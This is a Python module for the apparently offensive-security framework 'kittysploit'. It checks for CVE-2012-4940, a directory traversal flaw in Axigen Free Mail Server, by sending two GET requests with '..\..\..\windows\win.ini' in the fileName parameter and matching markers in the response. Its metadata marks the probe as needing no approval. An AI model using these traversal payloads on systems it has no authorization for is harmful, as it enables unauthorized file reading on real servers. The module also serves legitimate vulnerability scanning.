#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple directory traversal vulnerabilities in the View Log Files component in Axigen Free Mail Server allow ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Axigen Mail Server Filename Directory Traversal Detection',
        'description': 'Multiple directory traversal vulnerabilities in the View Log Files component in Axigen Free Mail Server allow remote attackers to read or delete arbitrary files via a .. (dot dot) in the fileName parameter in a download action to source/loggin/page_log_dwn_file.hsp, or the fileName parameter in an edit or delete action to the default URI.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2012', 'edb', 'axigen', 'lfi', 'mail', 'gecad', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/37996',
            'https://nvd.nist.gov/vuln/detail/CVE-2012-4940',
            'http://www.kb.cert.org/vuls/id/586556',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2012-4940',
    }

    def run(self):
        for path in ('/?h=44ea8a6603cbf54e245f37b4ddaf8f36&page=vlf&action=edit&fileName=..\\..\\..\\windows\\win.ini', '/source/loggin/page_log_dwn_file.hsp?h=44ea8a6603cbf54e245f37b4ddaf8f36&action=download&fileName=..\\..\\..\\windows\\win.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('bit app support', 'fonts', 'extensions',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='medium',
                    reason="Axigen Mail Server Filename Directory Traversal detected",
                    path=path,
                )
                return True
        return False

